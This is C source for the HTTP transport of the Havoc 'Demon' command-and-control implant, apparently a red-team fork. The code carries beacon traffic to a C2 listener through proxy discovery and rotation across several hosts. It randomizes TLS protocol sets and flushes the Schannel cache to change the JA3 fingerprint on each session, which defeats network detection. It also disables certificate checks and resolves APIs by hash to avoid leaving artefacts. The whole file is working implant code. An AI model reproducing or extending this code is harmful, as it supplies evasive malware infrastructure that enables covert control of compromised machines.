#include <Demon.h>

#include <core/TransportHttp.h>
#include <core/MiniStd.h>

#ifdef TRANSPORT_HTTP

/* ARC-06: safe fallback for older MinGW SDKs that predate TLS 1.3 WinHTTP flags */
#ifndef WINHTTP_FLAG_SECURE_PROTOCOL_TLS1_3
#define WINHTTP_FLAG_SECURE_PROTOCOL_TLS1_3 0x00002000
#endif

/*!
 * @brief
 *  Rotate the per-connection TLS fingerprint (ARC-06).
 *
 *  Picks a random TLS protocol-version bitmask from a set of six safe
 *  combinations (every entry includes TLS 1.2 so standard servers always
 *  accept the connection), flushes Schannel's TLS session cache via
 *  SslEmptyCache to prevent session resumption from masking the new
 *  parameters, and tears down the cached WinHTTP session so the new flags
 *  take effect on the next call to HttpSend.
 *
 *  The chosen bitmask is stored in Instance->Config.Transport.Ja3ProtoSet
 *  and applied to the freshly created session handle inside HttpSend.
 *
 *  Must only be called when Config.Transport.Ja3Randomize is TRUE.
 */
VOID HttpJa3Randomize( VOID )
{
    typedef BOOL ( WINAPI *SslEmptyCache_t )( PSTR pszTargetName, DWORD dwFlags );

    /* Six TLS protocol-version combinations that produce distinct Schannel
     * ClientHellos and therefore distinct JA3 hashes.  Every entry includes
     * TLS 1.2 so the connection succeeds against any server that supports
     * at minimum TLS 1.2 (universal as of 2024). */
    static const DWORD ProtoSets[] = {
        /* 0: TLS 1.2 only */
        WINHTTP_FLAG_SECURE_PROTOCOL_TLS1_2,
        /* 1: TLS 1.2 + TLS 1.3 */
        WINHTTP_FLAG_SECURE_PROTOCOL_TLS1_2 | WINHTTP_FLAG_SECURE_PROTOCOL_TLS1_3,
        /* 2: TLS 1.1 + TLS 1.2 */
        WINHTTP_FLAG_SECURE_PROTOCOL_TLS1_1 | WINHTTP_FLAG_SECURE_PROTOCOL_TLS1_2,
        /* 3: TLS 1.1 + TLS 1.2 + TLS 1.3 */
        WINHTTP_FLAG_SECURE_PROTOCOL_TLS1_1 | WINHTTP_FLAG_SECURE_PROTOCOL_TLS1_2 | WINHTTP_FLAG_SECURE_PROTOCOL_TLS1_3,
        /* 4: TLS 1.0 + TLS 1.1 + TLS 1.2 */
        WINHTTP_FLAG_SECURE_PROTOCOL_TLS1   | WINHTTP_FLAG_SECURE_PROTOCOL_TLS1_1 | WINHTTP_FLAG_SECURE_PROTOCOL_TLS1_2,
        /* 5: TLS 1.0 + TLS 1.1 + TLS 1.2 + TLS 1.3 */
        WINHTTP_FLAG_SECURE_PROTOCOL_TLS1   | WINHTTP_FLAG_SECURE_PROTOCOL_TLS1_1 | WINHTTP_FLAG_SECURE_PROTOCOL_TLS1_2 | WINHTTP_FLAG_SECURE_PROTOCOL_TLS1_3,
    };
    DWORD            ProtoCount   = sizeof( ProtoSets ) / sizeof( ProtoSets[ 0 ] );
    SslEmptyCache_t  FnEmpty      = NULL;
    PVOID            SchannelMod  = NULL;
    /* Stack-allocated DLL name — avoids a heap artefact for a single lookup. */
    CHAR             SchannelName[ 13 ] = { 'S','c','h','a','n','n','e','l','.','d','l','l','\0' };

    /* Pick a uniformly random protocol-version set. */
    Instance->Config.Transport.Ja3ProtoSet = ProtoSets[ RandomNumber32() % ProtoCount ];

    /* Flush Schannel's process-wide TLS session cache so the next TCP
     * connection sends a fresh ClientHello rather than resuming a cached
     * session, which would reuse the previous cipher parameters. */
    SchannelMod = LdrModuleLoad( SchannelName );
    if ( SchannelMod ) {
        FnEmpty = (SslEmptyCache_t) LdrFunctionAddr( SchannelMod, H_FUNC_SSLEMPTYCACHE );
        if ( FnEmpty ) {
            FnEmpty( NULL, 0 );
        }
    }

    /* Tear down the cached WinHTTP session so it is recreated with the new
     * protocol flags on the next HttpSend call. */
    if ( Instance->hHttpSession ) {
        Instance->Win32.WinHttpCloseHandle( Instance->hHttpSession );
        Instance->hHttpSession = NULL;
    }

    /* Release any cached proxy-discovery result — it will be re-detected
     * when the new session is opened (one round-trip overhead at most). */
    if ( Instance->ProxyForUrl ) {
        Instance->Win32.LocalFree( Instance->ProxyForUrl );
        Instance->ProxyForUrl       = NULL;
        Instance->SizeOfProxyForUrl = 0;
    }
    Instance->LookedForProxy = FALSE;
}

/*!
 * Build a full http(s)://host[:port]/path URL for WinHttpGetProxyForUrl.
 *
 * MSDN expects a URL including the scheme for WinHttpGetProxyForUrl. Demon/Havoc
 * historically passed only the relative URI segment (see HttpEndpoint inside
 * HttpSend). Passing a bare path triggers long-running WPAD auto-detection on
 * some Windows builds and can delay WinHttpSendRequest long enough that C2 check-in
 * times out before any outbound SYN is visible on netstat.
 */
static LPWSTR HttpComposeUrlForProxyLookup(
    WCHAR * Buf,
    SIZE_T  CchBuf,
    LPWSTR  RelativePath
)
{
    PHOST_DATA H;
    LPCWSTR    scheme;
    LPCWSTR    hostUse;
    INT        nw;
    WCHAR      HostNz[ 128 ] = { 0 };
    SIZE_T     zi;

    if ( ! Buf || CchBuf < 16 || ! RelativePath ) {
        return RelativePath;
    }

    H = Instance->Config.Transport.Host;
    if ( ! H || ! H->Host ) {
        return RelativePath;
    }

    if ( ! Instance->Win32.swprintf_s ) {
        return RelativePath;
    }

    scheme  = Instance->Config.Transport.Secure ? L"https://" : L"http://";
    hostUse = H->Host;

    /* RFC 3986 / WinHTTP: bracketed IPv6 already includes '[' ']'; do not wrap twice. */
    if ( hostUse[ 0 ] == L'[' ) {
        nw = Instance->Win32.swprintf_s(
            Buf,
            CchBuf,
            L"%ls%ls:%lu%ls",
            scheme,
            hostUse,
            ( ULONG ) H->Port,
            RelativePath
        );
    } else if ( WcsStr( H->Host, L":" ) != NULL ) {
        /* Unbracketed IPv6: strip zone id (%scope) so WinHttpGetProxyForUrl sees a valid host. */
        zi = 0;
        while (
            zi < ( sizeof( HostNz ) / sizeof( HostNz[ 0 ] ) ) - 1
            && hostUse[ zi ]
        ) {
            if ( hostUse[ zi ] == L'%' ) {
                break;
            }
            HostNz[ zi ] = hostUse[ zi ];
            zi++;
        }
        HostNz[ zi ] = L'\0';

        nw = Instance->Win32.swprintf_s(
            Buf,
            CchBuf,
            L"%ls[%ls]:%lu%ls",
            scheme,
            HostNz,
            ( ULONG ) H->Port,
            RelativePath
        );
    } else {
        nw = Instance->Win32.swprintf_s(
            Buf,
            CchBuf,
            L"%ls%ls:%lu%ls",
            scheme,
            hostUse,
            ( ULONG ) H->Port,
            RelativePath
        );
    }

    if ( nw < 0 || ( SIZE_T ) nw >= CchBuf ) {
        return RelativePath;
    }

    return Buf;
}

/*!
 * Strict dotted-decimal IPv4 check for the WinHTTP transport Host field (no port).
 */
static BOOL HttpIsLiteralIpv4Host(
    LPCWSTR Host
)
{
    DWORD Parts   = 0;
    DWORD Val     = 0;
    BOOL  HasDigs = FALSE;

    if ( ! Host || ! Host[ 0 ] ) {
        return FALSE;
    }

    for ( SIZE_T i = 0; ; i++ ) {
        WCHAR Ch = Host[ i ];

        if ( Ch >= L'0' && Ch <= L'9' ) {
            Val = Val * 10 + ( DWORD )( Ch - L'0' );
            if ( Val > 255 ) {
                return FALSE;
            }
            HasDigs = TRUE;
        } else if ( Ch == L'.' || Ch == L'\0' ) {
            if ( ! HasDigs ) {
                return FALSE;
            }
            Parts++;
            Val     = 0;
            HasDigs = FALSE;
            if ( Ch == L'\0' ) {
                break;
            }
            if ( Parts >= 4 ) {
                /* Only four octets allowed; reject 1.2.3.4.trailing */
                if ( Host[ i + 1 ] != L'\0' ) {
                    return FALSE;
                }
            }
        } else {
            return FALSE;
        }
    }

    return Parts == 4;
}

/*!
 * When the C2 host is a literal address, PAC / WPAD / IE auto-proxy cannot help and
 * can stall WinHttpSendRequest long enough that check-in never opens TCP (vudj9).
 * Skip all WinHttpGetProxyForUrl / IE-config work for these hosts.
 */
static BOOL HttpHostSkipsWinHttpAutoproxy(
    LPCWSTR Host
)
{
    if ( ! Host || ! Host[ 0 ] ) {
        return FALSE;
    }

    /* Bracketed IPv6 as passed to WinHttpConnect, e.g. [::1] */
    if ( Host[ 0 ] == L'[' ) {
        return TRUE;
    }

    if ( HttpIsLiteralIpv4Host( Host ) ) {
        return TRUE;
    }

    /* Unbracketed IPv6 / zone (no dots in typical v6 host field) */
    if ( WcsStr( Host, L":" ) != NULL && WcsStr( Host, L"." ) == NULL ) {
        return TRUE;
    }

    return FALSE;
}

/*!
 * @brief
 *  send a http request
 *
 * @param Send
 *  buffer to send
 *
 * @param Resp
 *  buffer response
 *
 * @return
 *  if successful send request
 */
BOOL HttpSend(
    _In_      PBUFFER Send,
    _Out_opt_ PBUFFER Resp
) {
    HANDLE  Connect        = { 0 };
    HANDLE  Request        = { 0 };
    LPWSTR  HttpHeader     = { 0 };
    LPWSTR  HttpEndpoint   = { 0 };
    DWORD   HttpFlags      = { 0 };
    LPCWSTR HttpProxy      = { 0 };
    PWSTR   HttpScheme     = { 0 };
    DWORD   Counter        = { 0 };
    DWORD   Iterator       = { 0 };
    DWORD   BufRead        = { 0 };
    UCHAR   Buffer[ 1024 ] = { 0 };
    PVOID   RespBuffer     = { 0 };
    SIZE_T  RespSize       = { 0 };
    BOOL    Successful     = { 0 };

    WINHTTP_PROXY_INFO                   ProxyInfo        = { 0 };
    WINHTTP_CURRENT_USER_IE_PROXY_CONFIG ProxyConfig      = { 0 };
    WINHTTP_AUTOPROXY_OPTIONS            AutoProxyOptions = { 0 };

    /* we might impersonate a token that lets WinHttpOpen return an Error 5 (ERROR_ACCESS_DENIED) */
    TokenImpersonate( FALSE );

    /* ARC-06: rotate TLS fingerprint before each HTTPS connection so every
     * session produces a different JA3 hash. */
    if ( Instance->Config.Transport.Ja3Randomize && Instance->Config.Transport.Secure ) {
        HttpJa3Randomize();
    }

    /* if we don't have any more hosts left, then exit */
    if ( ! Instance->Config.Transport.Host ) {
        PUTS_DONT_SEND( "No hosts left to use... exit now." )
        CommandExit( NULL );
    }

    if ( ! Instance->hHttpSession ) {
        if ( Instance->Config.Transport.Proxy.Enabled ) {
            // Use preconfigured proxy
            HttpProxy = Instance->Config.Transport.Proxy.Url;

            /* PRINTF_DONT_SEND( "WinHttpOpen( %ls, WINHTTP_ACCESS_TYPE_NAMED_PROXY, %ls, WINHTTP_NO_PROXY_BYPASS, 0 )\n", Instance->Config.Transport.UserAgent, HttpProxy ) */
            Instance->hHttpSession = Instance->Win32.WinHttpOpen( Instance->Config.Transport.UserAgent, WINHTTP_ACCESS_TYPE_NAMED_PROXY, HttpProxy, WINHTTP_NO_PROXY_BYPASS, 0 );
        } else {
            // Autodetect proxy settings
            /* PRINTF_DONT_SEND( "WinHttpOpen( %ls, WINHTTP_ACCESS_TYPE_NO_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0 )\n", Instance->Config.Transport.UserAgent ) */
            Instance->hHttpSession = Instance->Win32.WinHttpOpen( Instance->Config.Transport.UserAgent, WINHTTP_ACCESS_TYPE_NO_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0 );
        }

        if ( ! Instance->hHttpSession ) {
            PRINTF_DONT_SEND( "WinHttpOpen: Failed => %d\n", NtGetLastError() )
            goto LEAVE;
        }

        /* ARC-06: apply the randomly chosen TLS protocol-version set to the
         * fresh session so Schannel advertises a different cipher-suite list
         * in the ClientHello, producing a distinct JA3 hash. */
        if ( Instance->Config.Transport.Ja3Randomize && Instance->Config.Transport.Secure ) {
            DWORD ProtoSet = Instance->Config.Transport.Ja3ProtoSet;
            Instance->Win32.WinHttpSetOption(
                Instance->hHttpSession,
                WINHTTP_OPTION_SECURE_PROTOCOLS,
                &ProtoSet,
                sizeof( DWORD )
            );
        }
    }

    /* PRINTF_DONT_SEND( "WinHttpConnect( %x, %ls, %d, 0 )\n", Instance->hHttpSession, Instance->Config.Transport.Host->Host, Instance->Config.Transport.Host->Port ) */
    if ( ! ( Connect = Instance->Win32.WinHttpConnect(
        Instance->hHttpSession,
        Instance->Config.Transport.Host->Host,
        Instance->Config.Transport.Host->Port,
        0
    ) ) ) {
        PRINTF_DONT_SEND( "WinHttpConnect: Failed => %d\n", NtGetLastError() )
        goto LEAVE;
    }

    while ( TRUE ) {
        if ( ! Instance->Config.Transport.Uris[ Counter ] ) {
            break;
        } else {
            Counter++;
        }
    }

    HttpEndpoint = Instance->Config.Transport.Uris[ RandomNumber32() % Counter ];
    HttpFlags    = WINHTTP_FLAG_BYPASS_PROXY_CACHE;

    if ( Instance->Config.Transport.Secure ) {
        HttpFlags |= WINHTTP_FLAG_SECURE;
    }

    /* PRINTF_DONT_SEND( "WinHttpOpenRequest( %x, %ls, %ls, NULL, NULL, NULL, %x )\n", hConnect, Instance->Config.Transport.Method, HttpEndpoint, HttpFlags ) */
    if ( ! ( Request = Instance->Win32.WinHttpOpenRequest(
        Connect,
        Instance->Config.Transport.Method,
        HttpEndpoint,
        NULL,
        NULL,
        NULL,
        HttpFlags
    ) ) ) {
        PRINTF_DONT_SEND( "WinHttpOpenRequest: Failed => %d\n", NtGetLastError() )
        goto LEAVE;
    }

    if ( Instance->Config.Transport.Secure ) {
        HttpFlags = SECURITY_FLAG_IGNORE_UNKNOWN_CA        |
                    SECURITY_FLAG_IGNORE_CERT_DATE_INVALID |
                    SECURITY_FLAG_IGNORE_CERT_CN_INVALID   |
                    SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE;

        if ( ! Instance->Win32.WinHttpSetOption( Request, WINHTTP_OPTION_SECURITY_FLAGS, &HttpFlags, sizeof( DWORD ) ) )
        {
            PRINTF_DONT_SEND( "WinHttpSetOption: Failed => %d\n", NtGetLastError() );
        }
    }

    /* Add our headers */
    do {
        HttpHeader = Instance->Config.Transport.Headers[ Iterator ];

        if ( ! HttpHeader )
            break;

        if ( ! Instance->Win32.WinHttpAddRequestHeaders( Request, HttpHeader, -1, WINHTTP_ADDREQ_FLAG_ADD ) ) {
            PRINTF_DONT_SEND( "Failed to add header: %ls", HttpHeader )
        }

        Iterator++;
    } while ( TRUE );

    if ( Instance->Config.Transport.Proxy.Enabled ) {

        // Use preconfigured proxy
        ProxyInfo.dwAccessType = WINHTTP_ACCESS_TYPE_NAMED_PROXY;
        ProxyInfo.lpszProxy    = Instance->Config.Transport.Proxy.Url;

        if ( ! Instance->Win32.WinHttpSetOption( Request, WINHTTP_OPTION_PROXY, &ProxyInfo, sizeof( WINHTTP_PROXY_INFO ) ) ) {
            PRINTF_DONT_SEND( "WinHttpSetOption: Failed => %d\n", NtGetLastError() );
        }

        if ( Instance->Config.Transport.Proxy.Username ) {
            if ( ! Instance->Win32.WinHttpSetOption(
                Request,
                WINHTTP_OPTION_PROXY_USERNAME,
                Instance->Config.Transport.Proxy.Username,
                StringLengthW( Instance->Config.Transport.Proxy.Username )
            ) ) {
                PRINTF_DONT_SEND( "Failed to set proxy username %u", NtGetLastError() );
            }
        }

        if ( Instance->Config.Transport.Proxy.Password ) {
            if ( ! Instance->Win32.WinHttpSetOption(
                Request,
                WINHTTP_OPTION_PROXY_PASSWORD,
                Instance->Config.Transport.Proxy.Password,
                StringLengthW( Instance->Config.Transport.Proxy.Password )
            ) ) {
                PRINTF_DONT_SEND( "Failed to set proxy password %u", NtGetLastError() );
            }
        }

    } else if ( ! Instance->LookedForProxy ) {
        PHOST_DATA CurHost    = Instance->Config.Transport.Host;
        LPCWSTR    ConnHost   = ( CurHost && CurHost->Host ) ? CurHost->Host : NULL;
        BOOL       SkipAutoPx = ConnHost && HttpHostSkipsWinHttpAutoproxy( ConnHost );

        if ( SkipAutoPx ) {
            /* Direct connect; avoids WinHttpGetProxyForUrl / PAC stalls on literal IPs (red-cell-c2-vudj9). */
            Instance->LookedForProxy = TRUE;
        } else {
            WCHAR  UrlForWinHttpProxy[ 1024 ];
            LPWSTR ProxyUrlLookup = HttpComposeUrlForProxyLookup(
                UrlForWinHttpProxy,
                sizeof( UrlForWinHttpProxy ) / sizeof( UrlForWinHttpProxy[ 0 ] ),
                HttpEndpoint
            );

            /*
             * IE/LAN settings first: lab VMs usually use direct outbound routing with no PAC.
             * Historically WinHttpGetProxyForUrl(AUTO_DETECT) ran before IE lookup and DHCP WPAD
             * could stall until check-in timed out (red-cell-c2-vudj9).
             *
             * When IE reports auto-detect only (or WinHttpGetIEProxyConfigForCurrentUser fails),
             * run WPAD via DNS only - DHCP probes add multi-second latency without helping typical C2 listeners.
             */
            if ( Instance->Win32.WinHttpGetIEProxyConfigForCurrentUser( &ProxyConfig ) ) {
                if ( ProxyConfig.lpszProxy != NULL && StringLengthW( ProxyConfig.lpszProxy ) != 0 ) {
                    ProxyInfo.dwAccessType    = WINHTTP_ACCESS_TYPE_NAMED_PROXY;
                    ProxyInfo.lpszProxy       = ProxyConfig.lpszProxy;
                    ProxyInfo.lpszProxyBypass = ProxyConfig.lpszProxyBypass;

                    PRINTF_DONT_SEND( "Using IE proxy %ls\n", ProxyInfo.lpszProxy );

                    Instance->SizeOfProxyForUrl = sizeof( WINHTTP_PROXY_INFO );
                    Instance->ProxyForUrl       = Instance->Win32.LocalAlloc( LPTR, Instance->SizeOfProxyForUrl );
                    MemCopy( Instance->ProxyForUrl, &ProxyInfo, Instance->SizeOfProxyForUrl );

                    ProxyConfig.lpszProxy       = NULL;
                    ProxyConfig.lpszProxyBypass = NULL;
                } else if ( ProxyConfig.lpszAutoConfigUrl != NULL && StringLengthW( ProxyConfig.lpszAutoConfigUrl ) != 0 ) {
                    AutoProxyOptions.dwFlags           = WINHTTP_AUTOPROXY_CONFIG_URL;
                    AutoProxyOptions.dwAutoDetectFlags = 0;
                    AutoProxyOptions.lpszAutoConfigUrl = ProxyConfig.lpszAutoConfigUrl;
                    AutoProxyOptions.lpvReserved       = NULL;
                    AutoProxyOptions.dwReserved        = 0;
                    AutoProxyOptions.fAutoLogonIfChallenged = TRUE;

                    PRINTF_DONT_SEND( "Trying to discover the proxy config via the config url %ls\n", AutoProxyOptions.lpszAutoConfigUrl );

                    if ( Instance->Win32.WinHttpGetProxyForUrl( Instance->hHttpSession, ProxyUrlLookup, &AutoProxyOptions, &ProxyInfo ) ) {
                        if ( ProxyInfo.lpszProxy ) {
                            PRINTF_DONT_SEND( "Using proxy %ls\n", ProxyInfo.lpszProxy );
                        }

                        Instance->SizeOfProxyForUrl = sizeof( WINHTTP_PROXY_INFO );
                        Instance->ProxyForUrl       = Instance->Win32.LocalAlloc( LPTR, Instance->SizeOfProxyForUrl );
                        MemCopy( Instance->ProxyForUrl, &ProxyInfo, Instance->SizeOfProxyForUrl );
                    }
                } else if ( ProxyConfig.fAutoDetect ) {
                    AutoProxyOptions.dwFlags                = WINHTTP_AUTOPROXY_AUTO_DETECT;
                    AutoProxyOptions.dwAutoDetectFlags      = WINHTTP_AUTO_DETECT_TYPE_DNS_A;
                    AutoProxyOptions.lpszAutoConfigUrl      = NULL;
                    AutoProxyOptions.lpvReserved            = NULL;
                    AutoProxyOptions.dwReserved             = 0;
                    AutoProxyOptions.fAutoLogonIfChallenged = TRUE;

                    if ( Instance->Win32.WinHttpGetProxyForUrl( Instance->hHttpSession, ProxyUrlLookup, &AutoProxyOptions, &ProxyInfo ) ) {
                        if ( ProxyInfo.lpszProxy ) {
                            PRINTF_DONT_SEND( "Using proxy %ls\n", ProxyInfo.lpszProxy );
                        }

                        Instance->SizeOfProxyForUrl = sizeof( WINHTTP_PROXY_INFO );
                        Instance->ProxyForUrl       = Instance->Win32.LocalAlloc( LPTR, Instance->SizeOfProxyForUrl );
                        MemCopy( Instance->ProxyForUrl, &ProxyInfo, Instance->SizeOfProxyForUrl );
                    }
                }
            } else {
                AutoProxyOptions.dwFlags                = WINHTTP_AUTOPROXY_AUTO_DETECT;
                AutoProxyOptions.dwAutoDetectFlags      = WINHTTP_AUTO_DETECT_TYPE_DNS_A;
                AutoProxyOptions.lpszAutoConfigUrl      = NULL;
                AutoProxyOptions.lpvReserved            = NULL;
                AutoProxyOptions.dwReserved             = 0;
                AutoProxyOptions.fAutoLogonIfChallenged = TRUE;

                if ( Instance->Win32.WinHttpGetProxyForUrl( Instance->hHttpSession, ProxyUrlLookup, &AutoProxyOptions, &ProxyInfo ) ) {
                    if ( ProxyInfo.lpszProxy ) {
                        PRINTF_DONT_SEND( "Using proxy %ls\n", ProxyInfo.lpszProxy );
                    }

                    Instance->SizeOfProxyForUrl = sizeof( WINHTTP_PROXY_INFO );
                    Instance->ProxyForUrl       = Instance->Win32.LocalAlloc( LPTR, Instance->SizeOfProxyForUrl );
                    MemCopy( Instance->ProxyForUrl, &ProxyInfo, Instance->SizeOfProxyForUrl );
                }
            }

            Instance->LookedForProxy = TRUE;
        }
    }

    if ( Instance->ProxyForUrl ) {
        if ( ! Instance->Win32.WinHttpSetOption( Request, WINHTTP_OPTION_PROXY, Instance->ProxyForUrl, Instance->SizeOfProxyForUrl ) ) {
            PRINTF_DONT_SEND( "WinHttpSetOption: Failed => %d\n", NtGetLastError() );
        }
    }

    /* Send package to our listener */
    if ( Instance->Win32.WinHttpSendRequest( Request, NULL, 0, Send->Buffer, Send->Length, Send->Length, 0 ) ) {
        if ( Instance->Win32.WinHttpReceiveResponse( Request, NULL ) ) {
            /* Is the server recognizing us ? are we good ?  */
            if ( HttpQueryStatus( Request ) != HTTP_STATUS_OK ) {
                PUTS_DONT_SEND( "HttpQueryStatus Failed: Is not HTTP_STATUS_OK (200)" )
                Successful = FALSE;
                goto LEAVE;
            }

            if ( Resp ) {
                RespBuffer = NULL;

                //
                // read the entire response into the Resp BUFFER
                //
                do {
                    Successful = Instance->Win32.WinHttpReadData( Request, Buffer, sizeof( Buffer ), &BufRead );
                    if ( ! Successful || BufRead == 0 ) {
                        break;
                    }

                    if ( ! RespBuffer ) {
                        RespBuffer = Instance->Win32.LocalAlloc( LPTR, BufRead );
                    } else {
                        RespBuffer = Instance->Win32.LocalReAlloc( RespBuffer, RespSize + BufRead, LMEM_MOVEABLE | LMEM_ZEROINIT );
                    }

                    RespSize += BufRead;

                    MemCopy( RespBuffer + ( RespSize - BufRead ), Buffer, BufRead );
                    MemSet( Buffer, 0, sizeof( Buffer ) );
                } while ( Successful == TRUE );

                Resp->Length = RespSize;
                Resp->Buffer = RespBuffer;

                Successful = TRUE;
            }
        }
    } else {
        if ( NtGetLastError() == ERROR_INTERNET_CANNOT_CONNECT ) {
            Instance->Session.Connected = FALSE;
        }

        PRINTF_DONT_SEND( "HTTP Error: %d\n", NtGetLastError() )
    }

LEAVE:
    if ( Connect ) {
        Instance->Win32.WinHttpCloseHandle( Connect );
    }

    if ( Request ) {
        Instance->Win32.WinHttpCloseHandle( Request );
    }

    if ( ProxyConfig.lpszProxy ) {
        Instance->Win32.GlobalFree( ProxyConfig.lpszProxy );
    }

    if ( ProxyConfig.lpszProxyBypass ) {
        Instance->Win32.GlobalFree( ProxyConfig.lpszProxyBypass );
    }

    if ( ProxyConfig.lpszAutoConfigUrl ) {
        Instance->Win32.GlobalFree( ProxyConfig.lpszAutoConfigUrl );
    }

    /* re-impersonate the token */
    TokenImpersonate( TRUE );

    if ( ! Successful ) {
        /* if we hit our max then we use our next host */
        Instance->Config.Transport.Host = HostFailure( Instance->Config.Transport.Host );
    }

    return Successful;
}

/*!
 * @brief
 *  Query the Http Status code from the request response.
 *
 * @param hRequest
 *  request handle
 *
 * @return
 *  Http status code
 */
DWORD HttpQueryStatus(
    _In_ HANDLE Request
) {
    DWORD StatusCode = 0;
    DWORD StatusSize = sizeof( DWORD );

    if ( Instance->Win32.WinHttpQueryHeaders(
        Request,
        WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
        WINHTTP_HEADER_NAME_BY_INDEX,
        &StatusCode,
        &StatusSize,
        WINHTTP_NO_HEADER_INDEX
    ) ) {
        return StatusCode;
    }

    return 0;
}

PHOST_DATA HostAdd(
    _In_ LPWSTR Host, SIZE_T Size, DWORD Port )
{
    PRINTF_DONT_SEND( "Host -> Host:[%ls] Size:[%ld] Port:[%ld]\n", Host, Size, Port );

    PHOST_DATA HostData = NULL;

    HostData       = MmHeapAlloc( sizeof( HOST_DATA ) );
    HostData->Host = MmHeapAlloc( Size + sizeof( WCHAR ) );
    HostData->Port = Port;
    HostData->Dead = FALSE;
    HostData->Next = Instance->Config.Transport.Hosts;

    /* Copy host to our buffer */
    MemCopy( HostData->Host, Host, Size );

    /* Add to hosts linked list */
    Instance->Config.Transport.Hosts = HostData;

    return HostData;
}

PHOST_DATA HostFailure( PHOST_DATA Host )
{
    if ( ! Host )
        return NULL;

    if ( Host->Failures == Instance->Config.Transport.HostMaxRetries )
    {
        /* we reached our max failed retries with our current host data
         * use next one */
        Host->Dead = TRUE;

        /* Get our next host based on our rotation strategy. */
        return HostRotation( Instance->Config.Transport.HostRotation );
    }

    /* Increase our failed counter */
    Host->Failures++;

    PRINTF_DONT_SEND( "Host [Host: %ls:%ld] failure counter increased to %d\n", Host->Host, Host->Port, Host->Failures )

    return Host;
}

/* Gets a random host from linked list. */
PHOST_DATA HostRandom()
{
    PHOST_DATA Host  = NULL;
    DWORD      Index = RandomNumber32() % HostCount();
    DWORD      Count = 0;

    Host = Instance->Config.Transport.Hosts;

    for ( ;; )
    {
        if ( Count == Index )
            break;

        if ( ! Host )
            break;

        /* if we are the end and still didn't found the random index quit. */
        if ( ! Host->Next )
        {
            Host = NULL;
            break;
        }

        Count++;

        /* Next host please */
        Host = Host->Next;
    }

    PRINTF_DONT_SEND( "Index: %d\n", Index )
    PRINTF_DONT_SEND( "Host : %p (%ls:%ld :: Dead[%s] :: Failures[%d])\n", Host, Host->Host, Host->Port, Host->Dead ? "TRUE" : "FALSE", Host->Failures )

    return Host;
}

PHOST_DATA HostRotation( SHORT Strategy )
{
    PHOST_DATA Host = NULL;

    if ( Instance->Config.Transport.NumHosts > 1 )
    {
        /*
         * Different CDNs can have different WPAD rules.
         * After rotating, look for the proxy again
         */
        Instance->LookedForProxy = FALSE;
    }

    if ( Strategy == TRANSPORT_HTTP_ROTATION_ROUND_ROBIN )
    {
        DWORD Count = 0;

        /* get linked list */
        Host = Instance->Config.Transport.Hosts;

        /* If our current host is empty
         * then return the top host from our linked list. */
        if ( ! Instance->Config.Transport.Host )
            return Host;

        for ( Count = 0; Count < HostCount();  )
        {
            /* check if it's not an empty pointer */
            if ( ! Host )
                break;

            /* if the host is dead (max retries limit reached) then continue */
            if ( Host->Dead )
                Host = Host->Next;
            else break;
        }
    }
    else if ( Strategy == TRANSPORT_HTTP_ROTATION_RANDOM )
    {
        /* Get a random Host */
        Host = HostRandom();

        /* if we fail use the first host we get available. */
        if ( Host->Dead )
            /* fallback to Round Robin */
            Host = HostRotation( TRANSPORT_HTTP_ROTATION_ROUND_ROBIN );
    }

    /* if we specified infinite retries then reset every "Failed" retries in our linked list and do this forever...
     * as the operator wants. */
    if ( ( Instance->Config.Transport.HostMaxRetries == 0 ) && ! Host )
    {
        PUTS_DONT_SEND( "Specified to keep going. To infinity... and beyond" )

        /* get linked list */
        Host = Instance->Config.Transport.Hosts;

        /* iterate over linked list */
        for ( ;; )
        {
            if ( ! Host )
                break;

            /* reset failures */
            Host->Failures = 0;
            Host->Dead     = FALSE;

            Host = Host->Next;
        }

        /* tell the caller to start at the beginning */
        Host = Instance->Config.Transport.Hosts;
    }

    return Host;
}

DWORD HostCount()
{
    PHOST_DATA Host  = NULL;
    PHOST_DATA Head  = NULL;
    DWORD      Count = 0;

    Head = Instance->Config.Transport.Hosts;
    Host = Head;

    do {

        if ( ! Host )
            break;

        Count++;

        Host = Host->Next;

        /* if we are at the beginning again then stop. */
        if ( Head == Host )
            break;

    } while ( TRUE );

    return Count;
}

BOOL HostCheckup()
{
    PHOST_DATA Host  = NULL;
    PHOST_DATA Head  = NULL;
    DWORD      Count = 0;
    BOOL       Alive = TRUE;

    Head = Instance->Config.Transport.Hosts;
    Host = Head;

    do {
        if ( ! Host )
            break;

        if ( Host->Dead )
            Count++;

        Host = Host->Next;

        /* if we are at the beginning again then stop. */
        if ( Head == Host )
            break;
    } while ( TRUE );

    /* check if every host is dead */
    if ( HostCount() == Count )
        Alive = FALSE;

    return Alive;
}
#endif
